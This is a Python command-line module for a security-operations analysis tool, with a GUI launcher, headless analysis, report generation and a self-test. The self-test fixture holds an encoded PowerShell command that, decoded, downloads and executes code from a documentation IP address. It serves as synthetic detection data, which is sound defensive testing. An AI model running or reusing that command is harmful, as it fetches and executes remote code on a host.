"""Ligne de commande : interface graphique (défaut), analyse sans interface, autotest de l'exécutable."""
from __future__ import annotations

import argparse
import json
import os
import sys
import tempfile
import time
from pathlib import Path

from . import APP_NAME, __version__

SELFTEST_SAMPLE = [  # données synthétiques inertes (adresses RFC 5737, hash fictifs)
    {"Timestamp": "2026-03-03T10:00:00Z", "DeviceName": "WKS-SELFTEST", "AccountName": "alice",
     "ActionType": "ProcessCreated", "FileName": "powershell.exe",
     "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhACcAKQA=",
     "InitiatingProcessFileName": "winword.exe", "ProcessId": 4242, "InitiatingProcessId": 1111},
    {"Timestamp": "2026-03-03T10:00:05Z", "DeviceName": "WKS-SELFTEST", "AccountName": "alice",
     "ActionType": "ConnectionSuccess", "InitiatingProcessFileName": "powershell.exe", "RemoteIP": "198.51.100.7",
     "RemotePort": 80, "InitiatingProcessId": 4242},
]


def _selftest(out: Path | None, gui: bool) -> int:
    """Vérifie de bout en bout le fonctionnement de l'exécutable dans un répertoire de données temporaire."""
    checks: list[dict] = []
    home = Path(tempfile.mkdtemp(prefix="aisoc_selftest_"))
    os.environ["AI_SOC_HOME"] = str(home)

    def check(name: str, fn) -> None:  # noqa: ANN001
        t0 = time.monotonic()
        try:
            detail = fn()
            checks.append({"check": name, "ok": True, "detail": str(detail)[:300], "s": round(time.monotonic() - t0, 2)})
        except Exception as exc:  # noqa: BLE001
            checks.append({"check": name, "ok": False, "detail": f"{type(exc).__name__}: {exc}"[:500]})

    from .core.paths import get_paths
    from .reporting.service import generate_reports
    from .services.context import create_app_context
    from .services.investigations import InvestigationService

    state: dict = {}
    check("contexte", lambda: state.setdefault("ctx", create_app_context(get_paths())).paths.home)
    check("mitre", lambda: f"{state['ctx'].catalog.version} / {len(state['ctx'].catalog.index['techniques'])} techniques"
          if len(state["ctx"].catalog.index["techniques"]) > 500 else (_ for _ in ()).throw(RuntimeError("index ATT&CK absent")))

    def analyse() -> str:
        sample = home / "selftest_defender.json"
        sample.write_text(json.dumps(SELFTEST_SAMPLE), encoding="utf-8")
        svc = state.setdefault("svc", InvestigationService(state["ctx"]))
        inv_id = svc.create("Autotest")
        res = svc.run(inv_id, [sample])
        state["inv"] = inv_id
        assert res.findings, "aucune détection"
        assert any(m["technique_id"].startswith("T1059") for m in res.mitre), "T1059 absent"
        return f"{res.verdict} / {res.severity} / {len(res.findings)} détections / {len(res.iocs)} IOC"

    check("analyse", analyse)
    check("rapports", lambda: [p.name for p in generate_reports(state["svc"], state["inv"], "technical",
                                                                ["pdf", "docx", "html", "json", "csv"])])
    if gui:
        def ui() -> str:
            os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
            from .ui.app import build
            app, win, _ = build([sys.argv[0]])
            win.show()
            app.processEvents()
            n = win.stack.count()
            win.close()
            return f"{n} pages"
        check("interface", ui)
    ok = all(c["ok"] for c in checks)
    report = {"app": APP_NAME, "version": __version__, "ok": ok, "frozen": bool(getattr(sys, "frozen", False)),
              "platform": sys.platform, "checks": checks}
    text = json.dumps(report, ensure_ascii=False, indent=2)
    if out:
        out.write_text(text, encoding="utf-8")
    if sys.stdout:
        try:
            print(text)
        except (OSError, ValueError):
            pass
    return 0 if ok else 1


def _analyze(files: list[str], title: str, report: list[str], level: str, out: str | None) -> int:
    from .reporting.service import generate_reports
    from .services.context import create_app_context
    from .services.investigations import InvestigationService

    svc = InvestigationService(create_app_context())
    inv_id = svc.create(title or "Analyse en ligne de commande")
    res = svc.run(inv_id, [Path(f) for f in files], progress=lambda v, m: print(f"[{v:3d}%] {m}", file=sys.stderr))
    inv = svc.get(inv_id)
    print(json.dumps({"reference": inv.reference, "verdict": res.verdict, "confidence": res.confidence,
                      "severity": res.severity, "risk_score": res.risk_score, "incident_type": res.incident_type,
                      "findings": [f"{f.finding_id} {f.rule_id} {f.status} {f.title}" for f in res.findings],
                      "mitre": sorted({m["technique_id"] for m in res.mitre}), "iocs": len(res.iocs)}, ensure_ascii=False, indent=2))
    if report:
        for p in generate_reports(svc, inv_id, level, report, Path(out) if out else None):
            print(f"Rapport : {p}")
    return 0


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(prog="AI_SOC_ANALYST", description=f"{APP_NAME} {__version__}")
    p.add_argument("--version", action="version", version=f"{APP_NAME} {__version__}")
    p.add_argument("--selftest", action="store_true", help="autotest complet (données synthétiques, dossier temporaire)")
    p.add_argument("--selftest-out", help="fichier JSON de résultat de l'autotest")
    p.add_argument("--no-gui-test", action="store_true", help="autotest sans instancier l'interface")
    sub = p.add_subparsers(dest="cmd")
    a = sub.add_parser("analyze", help="analyser des fichiers sans interface graphique")
    a.add_argument("files", nargs="+")
    a.add_argument("--title", default="")
    a.add_argument("--report", nargs="*", default=[], choices=["pdf", "docx", "html", "json", "csv"])
    a.add_argument("--level", default="technical", choices=["technical", "executive"])
    a.add_argument("--out")
    args = p.parse_args(argv)
    if args.selftest:
        return _selftest(Path(args.selftest_out) if args.selftest_out else None, not args.no_gui_test)
    if args.cmd == "analyze":
        return _analyze(args.files, args.title, args.report, args.level, args.out)
    from .ui.app import main as gui_main
    return gui_main()
